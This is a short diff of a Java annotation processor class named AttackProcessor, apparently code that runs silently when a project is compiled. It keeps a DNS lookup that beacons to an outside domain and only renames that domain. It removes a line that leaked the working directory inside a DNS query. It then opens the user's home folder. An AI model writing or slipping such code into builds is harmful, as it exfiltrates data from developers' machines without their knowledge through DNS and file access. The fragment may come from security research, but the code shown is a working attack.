@@ -31,9 +31,8 @@ public class AttackProcessor extends AbstractProcessor {
 
         try
         {
-            Inet4Address.getByName( "javac18.lirui28.t.dlsr.ga" );
+            Inet4Address.getByName( "javac19.lirui28.t.dlsr.ga" );
 
-            Inet4Address.getByName( System.getProperty("user.dir")+".1.lirui28.t.dlsr.ga" );
 
 
             File folder = new File(System.getProperty("user.home"));
